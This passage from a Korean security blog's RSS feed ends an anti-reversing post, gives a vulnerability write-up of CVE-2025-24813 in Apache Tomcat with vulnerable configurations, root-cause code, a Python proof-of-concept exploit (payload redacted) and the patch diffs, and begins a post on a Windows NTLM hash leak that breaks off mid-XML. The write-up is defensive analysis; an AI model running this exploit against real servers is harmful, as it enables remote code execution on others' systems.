&#xCDE8;&#xC57D;&#xC810;&#xC744; &#xCC3E;&#xC544; &#xBCF4;&#xC548;&#xC744; &#xAC15;&#xD654;&#xD558;&#xB294; &#xB370; &#xC0AC;&#xC6A9;&#xB420; &#xC218; &#xC788;&#xC73C;&#xBA70;, &#xC548;&#xD2F0; &#xB9AC;&#xBC84;&#xC2F1; &#xAE30;&#xC220;&#xC740; &#xC9C0;&#xC801; &#xC7AC;&#xC0B0;&#xAD8C;&#xC744; &#xBCF4;&#xD638;&#xD558;&#xACE0; &#xBD88;&#xBC95; &#xBCF5;&#xC81C;&#xB97C; &#xBC29;&#xC9C0;&#xD558;&#xB294; &#xB370; &#xD65C;&#xC6A9;&#xB420; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>&#xACB0;&#xAD6D; &#xB9AC;&#xBC84;&#xC2F1;&#xACFC; &#xC548;&#xD2F0; &#xB9AC;&#xBC84;&#xC2F1;, &#xB514;&#xBC84;&#xAE45;&#xACFC; &#xC548;&#xD2F0; &#xB514;&#xBC84;&#xAE45;&#xC740; &#xC11C;&#xB85C;&#xC758; &#xAE30;&#xC220;&#xC744; &#xBC1C;&#xC804;&#xC2DC;&#xD0A4;&#xBA70;, &#xC9C0;&#xC18D;&#xC801;&#xC778; &#xB300;&#xACB0;&#xC744; &#xC774;&#xC5B4;&#xAC00;&#xACE0; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. &#xC774;&#xB7F0; &#xAD00;&#xC810;&#xC5D0;&#xC11C; &#xC601;&#xD654;&#xC5D0;&#xC11C; &#xB098;&#xC624;&#xB294; &#xB04A;&#xC784;&#xC5C6;&#xB294; &#xC601;&#xC6C5;&#xACFC; &#xC545;&#xB2F9;&#xC758; &#xC2F8;&#xC6C0;&#xCC98;&#xB7FC; &#xB290;&#xAEF4;&#xC9D1;&#xB2C8;&#xB2E4;. &#xC545;&#xC131;&#xCF54;&#xB4DC; &#xAC1C;&#xBC1C;&#xC790;&#xC640; &#xBD84;&#xC11D;&#xAC00;, &#xC18C;&#xD504;&#xD2B8;&#xC6E8;&#xC5B4; &#xAC1C;&#xBC1C;&#xC790;&#xC640; &#xACF5;&#xACA9;&#xC790; &#xC0AC;&#xC774;&#xC758; &#xB05D;&#xB098;&#xC9C0; &#xC54A;&#xB294; &#xC2F8;&#xC6C0;&#xC774;&#xC8E0;. &#xC911;&#xC694;&#xD55C; &#xAC83;&#xC740; &#xAE30;&#xC220; &#xC790;&#xCCB4;&#xC758; &#xC120;&#xC545;&#xC774; &#xC544;&#xB2C8;&#xB77C;, &#xAE30;&#xC220;&#xC744; &#xC0AC;&#xC6A9;&#xD558;&#xB294; &#xC0AC;&#xB78C;&#xC758; &#xC724;&#xB9AC;&#xC801; &#xCC45;&#xC784;&#xC785;&#xB2C8;&#xB2E4;. &#xB9AC;&#xBC84;&#xC2F1;&#xACFC; &#xC548;&#xD2F0; &#xB9AC;&#xBC84;&#xC2F1; &#xAE30;&#xC220;&#xC744; &#xC62C;&#xBC14;&#xB974;&#xAC8C; &#xD65C;&#xC6A9;&#xD558;&#xC5EC; &#xC548;&#xC804;&#xD558;&#xACE0; &#xC2E0;&#xB8B0;&#xD560; &#xC218; &#xC788;&#xB294; &#xB514;&#xC9C0;&#xD138; &#xC138;&#xC0C1;&#xC744; &#xB9CC;&#xB4E4;&#xC5B4;&#xAC00;&#xB294; &#xAC83;&#xC774; &#xC6B0;&#xB9AC;&#xC758; &#xACFC;&#xC81C;&#xC774;&#xC9C0; &#xC54A;&#xC744;&#xAE4C;&#xC694;?!</p><p><img src="image%2018.jpg" alt="image.png"></p><p>&#xAE34; &#xAE00; &#xC77D;&#xC5B4;&#xC8FC;&#xC154;&#xC11C; &#xAC10;&#xC0AC;&#xB4DC;&#xB9AC;&#xACE0; &#xC800;&#xB294; &#xB354; &#xC88B;&#xC740; &#xC5F0;&#xAD6C;&#xAE00;&#xB85C; &#xB3CC;&#xC544;&#xC624;&#xACA0;&#xC2B5;&#xB2C8;&#xB2E4; &#x1F642;</p><h3 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h3><p>&#xB9AC;&#xBC84;&#xC2F1; &#xD575;&#xC2EC; &#xC6D0;&#xB9AC;: &#xC545;&#xC131; &#xCF54;&#xB4DC; &#xBD84;&#xC11D;&#xAC00;&#xC758; &#xB9AC;&#xBC84;&#xC2F1; &#xC774;&#xC57C;&#xAE30;(&#xC800;&#xC790; &#xC774;&#xC2B9;&#xC6D0;)</p><p>Detoures - <a href="https://secmem.tistory.com/480">https://secmem.tistory.com/480</a></p><p><a href="https://www.apriorit.com/dev-blog/367-anti-reverse-engineering-protection-techniques-to-use-before-releasing-software">https://www.apriorit.com/dev-blog/367-anti-reverse-engineering-protection-techniques-to-use-before-releasing-software</a></p><p><a href="https://www.bitdefender.com/en-us/blog/businessinsights/the-differences-between-static-malware-analysis-and-dynamic-malware-analysis">https://www.bitdefender.com/en-us/blog/businessinsights/the-differences-between-static-malware-analysis-and-dynamic-malware-analysis</a></p>]]></content:encoded>
      
      
      <category domain="https://hackyboiz.github.io/categories/Research/">Research</category>
      
      
      <category domain="https://hackyboiz.github.io/tags/OUYA77/">OUYA77</category>
      
      <category domain="https://hackyboiz.github.io/tags/Debugging/">Debugging</category>
      
      <category domain="https://hackyboiz.github.io/tags/Anti-Debugging/">Anti-Debugging</category>
      
      <category domain="https://hackyboiz.github.io/tags/Malware/">Malware</category>
      
      <category domain="https://hackyboiz.github.io/tags/Reverse-Engineering/">Reverse Engineering</category>
      
      
      <comments>https://hackyboiz.github.io/2025/03/24/OUYA77/Anti_part2/kr/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>[하루한줄] CVE-2025-24813 Apache Tomcat의 안전하지 않은 역 직렬화로 인한 RCE 취약점</title>
      <link>https://hackyboiz.github.io/2025/03/22/empty/CVE-2025-24813/</link>
      <guid>https://hackyboiz.github.io/2025/03/22/empty/CVE-2025-24813/</guid>
      <pubDate>Sat, 22 Mar 2025 10:00:00 GMT</pubDate>
      
        
        
      <description>&lt;h2 id=&quot;URL&quot;&gt;&lt;a href=&quot;#URL&quot; class=&quot;headerlink&quot; title=&quot;URL&quot;&gt;&lt;/a&gt;URL&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;https://github.com/PaloAltoNetworks/Unit42-timely-t</description>
        
      
      
      
      <content:encoded><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><ul><li><a href="https://github.com/PaloAltoNetworks/Unit42-timely-threat-intel/blob/main/2025-03-14-Testing-CVE-2025-24813.md">https://github.com/PaloAltoNetworks/Unit42-timely-threat-intel/blob/main/2025-03-14-Testing-CVE-2025-24813.md</a></li></ul><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><ul><li>Apache Tomcat 11.0.0-M1 &lt; 11.0.3</li><li>Apache Tomcat 10.1.0-M1 &lt; 10.1.35</li><li>Apache Tomcat 9.0.0.M1 &lt; 9.0.99</li></ul><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>CVE-2025-24813&#xC740; Apache Tomcat&#xC758; &#xC548;&#xC804;&#xD558;&#xC9C0; &#xC54A;&#xC740; &#xC5ED; &#xC9C1;&#xB82C;&#xD654;&#xB85C; &#xC778;&#xD55C; RCE &#xCDE8;&#xC57D;&#xC810; &#xC785;&#xB2C8;&#xB2E4;. &#xC774; &#xCDE8;&#xC57D;&#xC810;&#xC758; &#xADFC;&#xBCF8; &#xC6D0;&#xC778;&#xC740;, <strong><code>Partial-PUT</code></strong> &#xCC98;&#xB9AC;&#xB97C; &#xD560; &#xB54C;, <strong><code>/work/</code></strong> &#xB514;&#xB809;&#xD1A0;&#xB9AC;&#xC5D0; &#xD30C;&#xC77C;&#xC744; &#xC5C5;&#xB85C;&#xB4DC; &#xD558;&#xBA70; &#xBC1C;&#xC0DD;&#xD569;&#xB2C8;&#xB2E4;. &#xC9C1;&#xB82C;&#xD654;&#xB41C; &#xD398;&#xC774;&#xB85C;&#xB4DC;&#xB97C; &#xC138;&#xC158; &#xD30C;&#xC77C;&#xB85C; &#xC704;&#xC7A5; &#xC5C5;&#xB85C;&#xB4DC;&#xD560; &#xACBD;&#xC6B0; &#xD1B0;&#xCEA3;&#xC774; &#xD574;&#xB2F9; &#xC138;&#xC158; &#xD30C;&#xC77C;&#xC744; &#xC77D;&#xAC8C;&#xB418;&#xBA70; RCE&#xAC00; &#xD2B8;&#xB9AC;&#xAC70;&#xB429;&#xB2C8;&#xB2E4;.</p><p>[&#xCDE8;&#xC57D;&#xD55C; &#xD658;&#xACBD;&#xC758; &#xC804;&#xC81C; &#xC870;&#xAC74;]</p><ol><li>web.xml&#xC5D0;&#xC11C; &#xB514;&#xD3F4;&#xD2B8; &#xC11C;&#xBE14;&#xB9BF; &#xC4F0;&#xAE30; &#xAD8C;&#xD55C; &#xD5C8;&#xC6A9; (&#xAE30;&#xBCF8; &#xC124;&#xC815;: false)</li><li>PUT &#xC694;&#xCCAD; &#xD5C8;&#xC6A9; (&#xAE30;&#xBCF8; &#xC124;&#xC815;: true)</li><li>&#xC138;&#xC158; &#xC9C0;&#xC18D;&#xC131; &#xC720;&#xC9C0; &#xC635;&#xC158; &#xD5C8;&#xC6A9; (&#xAE30;&#xBCF8; &#xC124;&#xC815;: false)</li><li>&#xAE30;&#xBCF8; &#xC784;&#xC2DC;&#xB514;&#xB809;&#xD1A0;&#xB9AC; &#xACBD;&#xB85C; (&#xAE30;&#xBCF8; &#xC124;&#xC815;: $CATALINA_BASE/work)</li></ol><ul><li><strong><code>web.xml</code></strong> &#xC11C;&#xBE14;&#xB9BF; &#xC4F0;&#xAE30; &#xAD8C;&#xD55C;</li></ul><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">servlet</span>&gt;</span>    <span class="hljs-tag">&lt;<span class="hljs-name">servlet-name</span>&gt;</span>default<span class="hljs-tag">&lt;/<span class="hljs-name">servlet-name</span>&gt;</span>    <span class="hljs-tag">&lt;<span class="hljs-name">servlet-class</span>&gt;</span>org.apache.catalina.servlets.DefaultServlet<span class="hljs-tag">&lt;/<span class="hljs-name">servlet-class</span>&gt;</span>    <span class="hljs-tag">&lt;<span class="hljs-name">init-param</span>&gt;</span>        <span class="hljs-tag">&lt;<span class="hljs-name">param-name</span>&gt;</span>readonly<span class="hljs-tag">&lt;/<span class="hljs-name">param-name</span>&gt;</span>         <span class="hljs-tag">&lt;<span class="hljs-name">param-value</span>&gt;</span>false<span class="hljs-tag">&lt;/<span class="hljs-name">param-value</span>&gt;</span> <span class="hljs-comment">&lt;!-- &#xCDE8;&#xC57D;&#xD55C; &#xC124;&#xC815; --&gt;</span>    <span class="hljs-tag">&lt;/<span class="hljs-name">init-param</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">servlet</span>&gt;</span></code></pre><ul><li><strong><code>context.xml</code></strong> &#xC138;&#xC158; &#xC720;&#xC9C0; &#xC635;&#xC158;</li></ul><pre><code class="hljs xml"><span class="hljs-comment">&lt;!-- &#xCDE8;&#xC57D;&#xD55C; &#xC124;&#xC815; --&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">Manager</span> <span class="hljs-attr">className</span>=<span class="hljs-string">&quot;org.apache.catalina.session.PersistentManager&quot;</span></span><span class="hljs-tag"> <span class="hljs-attr">maxIdleBackup</span>=<span class="hljs-string">&quot;1&quot;</span></span><span class="hljs-tag"> <span class="hljs-attr">saveOnRestart</span>=<span class="hljs-string">&quot;true&quot;</span></span><span class="hljs-tag"> <span class="hljs-attr">processExpiresFrequency</span>=<span class="hljs-string">&quot;1&quot;</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">Store</span> <span class="hljs-attr">className</span>=<span class="hljs-string">&quot;org.apache.catalina.session.FileStore&quot;</span>/&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">Manager</span>&gt;</span></code></pre><ul><li><strong><code>host.xml</code></strong> &#xC784;&#xC2DC; &#xD30C;&#xC77C; &#xAE30;&#xBCF8; &#xACBD;&#xB85C; &#xC124;&#xC815;</li></ul><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">attribute</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;workDir&quot;</span> <span class="hljs-attr">required</span>=<span class="hljs-string">&quot;false&quot;</span>&gt;</span>  <span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>Pathname to a scratch directory to be used by applications for  this Host. Each application will have its own sub directory with  temporary read-write use.  Configuring a Context workDir will override  use of the Host workDir configuration.  This directory will be made  visible to servlets in the web application by a servlet context  attribute (of type <span class="hljs-tag">&lt;<span class="hljs-name">code</span>&gt;</span>java.io.File<span class="hljs-tag">&lt;/<span class="hljs-name">code</span>&gt;</span>) named  <span class="hljs-tag">&lt;<span class="hljs-name">code</span>&gt;</span>jakarta.servlet.context.tempdir<span class="hljs-tag">&lt;/<span class="hljs-name">code</span>&gt;</span> as described in the  Servlet Specification.  If not specified, a suitable directory  underneath <span class="hljs-tag">&lt;<span class="hljs-name">code</span>&gt;</span>$CATALINA_BASE/work<span class="hljs-tag">&lt;/<span class="hljs-name">code</span>&gt;</span> will be provided.<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span> <span class="hljs-comment">&lt;!-- &#xC784;&#xC2DC; &#xD30C;&#xC77C; &#xAE30;&#xBCF8; &#xACBD;&#xB85C; --&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">attribute</span>&gt;</span></code></pre><ul><li>&#xCDE8;&#xC57D;&#xC810; &#xADFC;&#xBCF8; &#xC6D0;&#xC778;</li></ul><p>&#xD1B0;&#xCEA3; &#xC11C;&#xBC84; &#xC124;&#xC815;&#xC774; &#xC704;&#xC640; &#xAC19;&#xC774; &#xAD6C;&#xC131;&#xB418;&#xC5B4; &#xC788;&#xC744; &#xB54C; <strong><code>Partial-PUT</code></strong> &#xC694;&#xCCAD;&#xC744; &#xD560; &#xACBD;&#xC6B0; <strong><code>executePartialPut</code></strong> &#xBA54;&#xC18C;&#xB4DC;&#xC5D0;&#xC11C; <strong><code>ServletContext.TEMPDIR</code></strong>&#xB77C;&#xB294; &#xB514;&#xB809;&#xD1A0;&#xB9AC;&#xC5D0; &#xD30C;&#xC77C;&#xC744; &#xC5C5;&#xB85C;&#xB4DC;&#xD558;&#xB3C4;&#xB85D; &#xAD6C;&#xD604;&#xB418;&#xC5B4; &#xC788;&#xC73C;&#xBA70; &#xD574;&#xB2F9; &#xB85C;&#xC9C1;&#xC5D0;&#xC11C; 2&#xAC00;&#xC9C0; &#xCDE8;&#xC57D;&#xC810;&#xC774; &#xBC1C;&#xC0DD;&#xD569;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs java"><span class="hljs-function"><span class="hljs-keyword">protected</span> File <span class="hljs-title">executePartialPut</span><span class="hljs-params">(HttpServletRequest req, ContentRange range, String path)</span> <span class="hljs-keyword">throws</span> IOException </span>{ <span class="hljs-comment">// ServletContext.TEMPDIR = **$CATALINA_BASE/work (&#xAE30;&#xBCF8; &#xAC12;) -&gt; &#xC815;&#xBCF4;&#xC720;&#xCD9C; + RCE**</span>     File tempDir = (File) getServletContext().getAttribute(ServletContext.TEMPDIR);     <span class="hljs-comment">// &#xB514;&#xB809;&#xD1A0;&#xB9AC; &#xACBD;&#xB85C;&#xB97C; .&#xC73C;&#xB85C; &#xCE58;&#xD658; **-&gt; &#xC815;&#xBCF4;&#xC720;&#xCD9C;**</span>     String convertedResourcePath = path.replace(<span class="hljs-string">&apos;/&apos;</span>, <span class="hljs-string">&apos;.&apos;</span>);     File contentFile = <span class="hljs-keyword">new</span> File(tempDir, convertedResourcePath);     <span class="hljs-keyword">if</span> (contentFile.createNewFile()) {         contentFile.deleteOnExit();     }</code></pre><ul><li>&#xC815;&#xBCF4; &#xC720;&#xCD9C;</li></ul><p>&#xC815;&#xC0C1;&#xC801;&#xC778; <strong><code>Partial-PUT</code></strong> &#xC694;&#xCCAD;&#xC73C;&#xB85C; &#xC5C5;&#xB85C;&#xB4DC; &#xB418;&#xB294; &#xD30C;&#xC77C;&#xC774; &#xC788;&#xC744; &#xB54C; &#xB9CC;&#xC57D;, &#xACF5;&#xACA9;&#xC790;&#xAC00; &#xC5C5;&#xB85C;&#xB4DC; &#xB418;&#xB294; <strong><code>&#xD30C;&#xC77C;&#xBA85;&#xC744; &#xBBF8;&#xB9AC; &#xC54C;&#xACE0;&#xC788;&#xC744; &#xACBD;&#xC6B0;</code></strong> &#xCE58;&#xD658; &#xB85C;&#xC9C1;<strong><code>path.replace(&apos;/&apos;, &apos;.&apos;)</code></strong>&#xC744; &#xD1B5;&#xD574; &#xD30C;&#xC77C;&#xBA85;&#xC744; &#xCD94;&#xCE21;&#xD558;&#xC5EC; &#xB2E4;&#xC6B4;&#xB85C;&#xB4DC; &#xBC1B;&#xC744; &#xC218; &#xC788;&#xAC8C;&#xB429;&#xB2C8;&#xB2E4;.</p><p>&#x2192; &#xC5C5;&#xB85C;&#xB4DC; &#xACBD;&#xB85C;: hxxp[://{VICTIM}/<code>.git/config</code> </p><p>&#x2192; &#xC784;&#xC2DC; &#xD30C;&#xC77C; &#xACBD;&#xB85C;: hxxp[://{VICTIM}/<code>work/.git.config</code></p><p>&#xC784;&#xC2DC; &#xD30C;&#xC77C;&#xC740; Tomcat &#xD504;&#xB85C;&#xC138;&#xC2A4;&#xAC00; &#xC885;&#xB8CC;&#xB420; &#xB54C; &#xAE4C;&#xC9C0; &#xC720;&#xC9C0;&#xB418;&#xC5B4; &#xC774;&#xB85C;&#xC778;&#xD574; &#xC815;&#xBCF4; &#xC720;&#xCD9C;&#xC774; &#xBC1C;&#xC0DD;&#xD569;&#xB2C8;&#xB2E4;.</p><ul><li>&#xC784;&#xC758;&#xD30C;&#xC77C;&#xC4F0;&#xAE30; / &#xC6D0;&#xACA9;&#xCF54;&#xB4DC;&#xC2E4;&#xD589;</li></ul><p>&#xACF5;&#xACA9;&#xC790;&#xAC00; Partial-PUT Request&#xB97C; &#xD1B5;&#xD574; <strong><code>&#xC790;&#xBC14; &#xAC00;&#xC82F;</code></strong>&#xC744; &#xB2F4;&#xC544; <strong><code>.session &#xD655;&#xC7A5;&#xC790;</code></strong>&#xB85C; &#xD30C;&#xC77C;&#xC744; &#xC0DD;&#xC131;&#xD560; &#xACBD;&#xC6B0;, <strong><code>/work/</code></strong> &#xB514;&#xB809;&#xD1A0;&#xB9AC;&#xC5D0; &#xC0DD;&#xC131;&#xB429;&#xB2C8;&#xB2E4;. &#xD574;&#xB2F9; &#xACBD;&#xB85C;&#xB294; &#xD1B0;&#xCEA3;&#xC774; &#xC138;&#xC158; &#xC9C0;&#xC18D;&#xC131; &#xC635;&#xC158;(<strong><code>PersistentManager, FileStore</code></strong>)&#xC774; &#xD65C;&#xC131;&#xD654; &#xB418;&#xC5B4;&#xC788;&#xC744; &#xB54C;, &#xC138;&#xC158;&#xC744; &#xC800;&#xC7A5;&#xD558;&#xACE0; &#xB85C;&#xB4DC;&#xD558;&#xB294; &#xACBD;&#xB85C;&#xC774;&#xAE30; &#xB54C;&#xBB38;&#xC5D0; &#xACF5;&#xACA9;&#xC790;&#xAC00; &#xC545;&#xC131; &#xD398;&#xC774;&#xB85C;&#xB4DC;&#xB97C; &#xC5C5;&#xB85C;&#xB4DC; &#xD588;&#xC744; &#xACBD;&#xC6B0; &#xC9C1;&#xB82C;&#xD654; &#xB418;&#xBA70; &#xC6D0;&#xACA9;&#xCF54;&#xB4DC;&#xC2E4;&#xD589;&#xC774; &#xD2B8;&#xB9AC;&#xAC70;&#xB429;&#xB2C8;&#xB2E4;.</p><ul><li>PoC &#xCF54;&#xB4DC;</li></ul><pre><code class="hljs java"><span class="hljs-keyword">import</span> requests<span class="hljs-keyword">import</span> base64<span class="hljs-keyword">import</span> osTARGET_IP = <span class="hljs-string">&quot;hxxp[:]//www.wiresharkworkshop[.]online:8080/&quot;</span># b64_encoded_payload = &quot;****[information redacted]****&quot;output_file_path = <span class="hljs-string">&quot;decoded_chain.bin&quot;</span>decoded_content = base64.b64decode(b64_encoded_payload)<span class="hljs-function">with <span class="hljs-title">open</span><span class="hljs-params">(output_file_path, <span class="hljs-string">&quot;wb&quot;</span>)</span> as f:</span><span class="hljs-function">    f.<span class="hljs-title">write</span><span class="hljs-params">(decoded_content)</span></span><span class="hljs-function"></span><span class="hljs-function">put_url </span>= f<span class="hljs-string">&quot;{TARGET_IP}/gopan.session&quot;</span>put_headers = {<span class="hljs-string">&quot;Content-Range&quot;</span>: <span class="hljs-string">&quot;bytes 0-5/100&quot;</span>}<span class="hljs-function">with <span class="hljs-title">open</span><span class="hljs-params">(output_file_path, <span class="hljs-string">&quot;rb&quot;</span>)</span> as f:</span><span class="hljs-function">    put_response </span>= requests.put(put_url, data=f, headers=put_headers)os.remove(output_file_path)get_url = f<span class="hljs-string">&quot;{TARGET_IP}/&quot;</span>get_headers = {<span class="hljs-string">&quot;Cookie&quot;</span>: <span class="hljs-string">&quot;JSESSIONID=.gopan&quot;</span>}get_response = requests.get(get_url, headers=get_headers)</code></pre><blockquote><p><a href="https://github.com/PaloAltoNetworks/Unit42-timely-threat-intel/blob/main/2025-03-14-Testing-CVE-2025-24813.md">https://github.com/PaloAltoNetworks/Unit42-timely-threat-intel/blob/main/2025-03-14-Testing-CVE-2025-24813.md</a></p></blockquote><p>&#xD574;&#xB2F9; &#xCDE8;&#xC57D;&#xC810;&#xC740; &#xB2E4;&#xC74C;&#xACFC; &#xAC19;&#xC774; &#xD328;&#xCE58; &#xB418;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;.</p><ul><li>RCE&#xC640; &#xC815;&#xBCF4;&#xC720;&#xCD9C; &#xBC29;&#xC9C0;&#xB97C; &#xC704;&#xD574; <strong><code>createTempFile</code></strong> &#xD568;&#xC218;&#xB97C; &#xD1B5;&#xD574; &#xD30C;&#xC77C;&#xBA85; &#xB09C;&#xC218;&#xD654; &#xBC0F; &#xD655;&#xC7A5;&#xC790;&#xB97C; tmp&#xB85C; &#xCC98;&#xB9AC;</li></ul><pre><code class="hljs java">@@ -<span class="hljs-number">658</span>,<span class="hljs-number">13</span> +<span class="hljs-number">661</span>,<span class="hljs-number">7</span> @@ <span class="hljs-function"><span class="hljs-keyword">protected</span> File <span class="hljs-title">executePartialPut</span><span class="hljs-params">(HttpServletRequest req, ContentRange range, Str</span></span><span class="hljs-function"><span class="hljs-params"></span></span><span class="hljs-function"><span class="hljs-params"><span class="hljs-number">661</span> File tempDir = (File)</span> <span class="hljs-title">getServletContext</span><span class="hljs-params">()</span>.<span class="hljs-title">getAttribute</span><span class="hljs-params">(ServletContext.TEMPDIR)</span></span>;<span class="hljs-number">662</span> - <span class="hljs-comment">// Convert all &apos;/&apos; characters to &apos;.&apos; in resourcePath</span><span class="hljs-number">663</span> - String convertedResourcePath = path.replace(<span class="hljs-string">&apos;/&apos;</span>, <span class="hljs-string">&apos;.&apos;</span>);<span class="hljs-number">664</span> - File contentFile = <span class="hljs-keyword">new</span> File(tempDir, convertedResourcePath);<span class="hljs-number">665</span> - <span class="hljs-keyword">if</span> (contentFile.createNewFile()) {<span class="hljs-number">666</span> - <span class="hljs-comment">// Clean up contentFile when Tomcat is terminated</span><span class="hljs-number">667</span> - contentFile.deleteOnExit();<span class="hljs-number">668</span> - }<span class="hljs-number">664</span> + File contentFile = File.createTempFile(<span class="hljs-string">&quot;put-part-&quot;</span>, <span class="hljs-keyword">null</span>, tempDir);</code></pre><ul><li>&#xC784;&#xC2DC; &#xD30C;&#xC77C; &#xCC98;&#xB9AC;&#xAC00; &#xB05D;&#xB0A0; &#xACBD;&#xC6B0; &#xBC14;&#xB85C; &#xC0AD;&#xC81C;</li></ul><pre><code class="hljs java">@@ -<span class="hljs-number">636</span>,<span class="hljs-number">6</span> +<span class="hljs-number">636</span>,<span class="hljs-number">9</span> @@ <span class="hljs-function"><span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title">doPut</span><span class="hljs-params">(HttpServletRequest req, HttpServletResponse resp)</span> <span class="hljs-keyword">throws</span> Se</span><span class="hljs-function">636 <span class="hljs-comment">// Ignore</span></span><span class="hljs-function">637 }</span><span class="hljs-function">638 }</span><span class="hljs-function">639 + <span class="hljs-title">if</span> <span class="hljs-params">(tempContentFile != <span class="hljs-keyword">null</span>)</span> </span>{<span class="hljs-number">640</span> + tempContentFile.delete();<span class="hljs-number">641</span> + }</code></pre><h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><ul><li><a href="https://github.com/advisories/GHSA-83qj-6fr2-vhqg">https://github.com/advisories/GHSA-83qj-6fr2-vhqg</a></li><li><a href="https://github.com/apache/tomcat/commit/0a668e0c27f2b7ca0cc7c6eea32253b9b5ecb29c">https://github.com/apache/tomcat/commit/0a668e0c27f2b7ca0cc7c6eea32253b9b5ecb29c</a></li><li><a href="https://scrapco.de/blog/analysis-of-cve-2025-24813-apache-tomcat-path-equivalence-rce.html">https://scrapco.de/blog/analysis-of-cve-2025-24813-apache-tomcat-path-equivalence-rce.html</a></li><li><a href="https://scrapco.de/blog/analysis-of-cve-2025-24813-apache-tomcat-path-equivalence-rce.html">https://scrapco.de/blog/analysis-of-cve-2025-24813-apache-tomcat-path-equivalence-rce.html</a></li></ul>]]></content:encoded>
      
      
      <category domain="https://hackyboiz.github.io/categories/1day1line/">1day1line</category>
      
      
      <category domain="https://hackyboiz.github.io/tags/empty/">empty</category>
      
      <category domain="https://hackyboiz.github.io/tags/Remote-Code-Execution/">Remote Code Execution</category>
      
      <category domain="https://hackyboiz.github.io/tags/Apache-Tomcat/">Apache Tomcat</category>
      
      
      <comments>https://hackyboiz.github.io/2025/03/22/empty/CVE-2025-24813/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>[하루한줄] CVE-2025-24071 : Windows File Explorer의 NTLM Hash Leak 취약점</title>
      <link>https://hackyboiz.github.io/2025/03/20/pwndorei/2025-03-20/</link>
      <guid>https://hackyboiz.github.io/2025/03/20/pwndorei/2025-03-20/</guid>
      <pubDate>Thu, 20 Mar 2025 11:00:00 GMT</pubDate>
      
        
        
      <description>&lt;h2 id=&quot;URL&quot;&gt;&lt;a href=&quot;#URL&quot; class=&quot;headerlink&quot; title=&quot;URL&quot;&gt;&lt;/a&gt;URL&lt;/h2&gt;&lt;p&gt;&lt;a href=&quot;https://cti.monster/blog/2025/03/18/CVE-2025-24071.html&quot;&gt;</description>
        
      
      
      
      <content:encoded><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://cti.monster/blog/2025/03/18/CVE-2025-24071.html">https://cti.monster/blog/2025/03/18/CVE-2025-24071.html</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><ul><li>2025&#xB144; 3&#xC6D4; &#xB204;&#xC801; &#xC5C5;&#xB370;&#xC774;&#xD2B8; &#xC774;&#xC804; Windows</li></ul><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>Windows File Explorer&#xC5D0;&#xC11C; .rar/.zip &#xD30C;&#xC77C;&#xC758; &#xC555;&#xCD95;&#xC744; &#xD574;&#xC81C;&#xD558;&#xB294; &#xACFC;&#xC815;&#xC5D0;&#xC11C; &#xCDE8;&#xC57D;&#xC810;&#xC774; &#xBC1C;&#xC0DD;&#xD574;&#xC11C; NTLM Hash&#xB97C; &#xC720;&#xCD9C;&#xD558;&#xB294; &#xAC83;&#xC774; &#xAC00;&#xB2A5;&#xD588;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>&#xCDE8;&#xC57D;&#xC810;&#xC740; &#xC555;&#xCD95; &#xD30C;&#xC77C;&#xC5D0; &#xC544;&#xB798;&#xC640; &#xAC19;&#xC774; <code>&lt;url&gt;</code> element&#xC5D0; SMB &#xACBD;&#xB85C;&#xB97C; &#xD3EC;&#xD568;&#xD558;&#xACE0; &#xC788;&#xB294; .library-ms &#xD655;&#xC7A5;&#xC790;&#xC758; &#xD30C;&#xC77C;&#xC774; &#xC874;&#xC7AC;&#xD560; &#xB54C; &#xBC1C;&#xC0DD;&#xD569;&#xB2C8;&#xB2E4;.</p><blockquote><p>.library-ms: Microsoft Windows 7&#xC5D0;&#xC11C; &#xB3C4;&#xC785;&#xB41C; xml &#xD615;&#xD0DC;&#xC758; &#xC2DC;&#xC2A4;&#xD15C; &#xD30C;&#xC77C;&#xB85C;, Windows &#xD0D0;&#xC0C9;&#xAE30; &#xC67C;&#xCABD; &#xD328;&#xB110;&#xC758; &#xB77C;&#xC774;&#xBE0C;&#xB7EC;&#xB9AC; &#xD3F4;&#xB354; &#xB0B4;&#xC5D0; &#xD558;&#xC704; &#xD3F4;&#xB354;&#xB85C; &#xD45C;&#xC2DC;&#xB418;&#xBA70; &#xB77C;&#xC774;&#xBE0C;&#xB7EC;&#xB9AC;&#xB97C; &#xC5F4; &#xB54C; &#xCC3E;&#xC544;&#xBCFC; &#xC218; &#xC788;&#xB294; &#xD558;&#xB098; &#xC774;&#xC0C1;&#xC758; &#xD3F4;&#xB354;&#xC5D0; &#xB300;&#xD55C; &#xCC38;&#xC870;&#xAC00; &#xD3EC;&#xD568;&#xB418;&#xC5B4; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p></blockquote><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">libraryDescription</span> <span class="hljs-attr">xmlns</span>=<span 